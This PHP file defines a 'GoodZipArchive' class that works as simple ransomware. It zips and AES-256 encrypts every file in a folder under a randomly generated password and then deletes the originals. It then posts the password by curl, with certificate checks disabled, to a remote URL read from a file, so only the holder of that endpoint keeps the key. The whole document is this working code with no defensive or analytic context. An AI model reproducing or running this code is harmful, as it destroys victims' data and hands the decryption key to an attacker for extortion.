<?php class GoodZipArchive extends ZipArchive
{
	//@author Nicolas Heimann
	public function __construct($a=false, $b=false) {
    $this->create_func($a, $b);  }

	public function create_func($input_folder=false, $output_zip_file=false)
	{
    $pass = sha1(md5(substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil(64/strlen($x)) )),1,64)));
		if($input_folder !== false && $output_zip_file !== false)
		{
			$res = $this->open($output_zip_file, ZipArchive::CREATE);
			if($res === TRUE) 	{ $this->addDir($input_folder, basename($input_folder), $pass);
        echo "Generating Archive..." . "\n";
        $this->close(); }
			else
      { echo 'Could not create a zip archive.' . "\n"; }
      echo "Encryption Finished" . "\n";
      echo "Deleting Files..." . "\n";
      $this->dellDir($input_folder, basename($input_folder), $pass);
      echo "Delete Finished!" . "\n";
      echo "Storing Passcode..." . "\n";
      $ch = curl_init();
      $postData = array(
          "PASS" => $pass
          );
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($ch, CURLOPT_URL, file_get_contents("URL"));
      curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
      curl_setopt($ch, CURLOPT_POST, true);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

      curl_exec($ch);

      echo "Completed!";
		}
	}

    // Add a Dir with Files and Subdirs to the archive
    public function addDir($location, $name, $pass) {
        $this->addEmptyDir($name);
        $this->addDirDo($location, $name, $pass);
    }
    public function dellDir($location, $name, $pass) {
        $this->dellDirDo($location, $name, $pass);
    }

    // Add Files & Dirs to archive
    private function dellDirDo($location, $name, $pass) {
        $name .= '/';         $location .= '/';
      // Read all Files in Dir
        $dir = opendir ($location);
        while ($file = readdir($dir))    {
            if ($file == '.' || $file == '..') continue;
          // Rekursiv, If dir: GoodZipArchive::addDir(), else ::File();
          $do = (filetype( $location . $file) == 'dir') ? $this->dellDir($location . $file, $name . $file, $pass) : "";
          if($file != 'ENCRYPTED_DATA_' . date("Y-m-d") . '.zip'){
            unlink($name . $file);
          }
          echo 'Deleted ' . $name . $file . "\n";
        }
    }
    private function addDirDo($location, $name, $pass) {
        $name .= '/';         $location .= '/';
      // Read all Files in Dir
        $dir = opendir ($location);
        while ($file = readdir($dir))    {
            if ($file == '.' || $file == '..') continue;
          // Rekursiv, If dir: GoodZipArchive::addDir(), else ::File();
            $do = (filetype( $location . $file) == 'dir') ? $this->addDir($location . $file, $name . $file, $pass) : $this->addFile($location . $file, $name . $file);
            echo 'Encrypted  ' . $name . $file . "\n";
            $this->setPassword($pass);
            $this->setEncryptionName($name . $file, ZipArchive::EM_AES_256);
        }
    }
}
?>
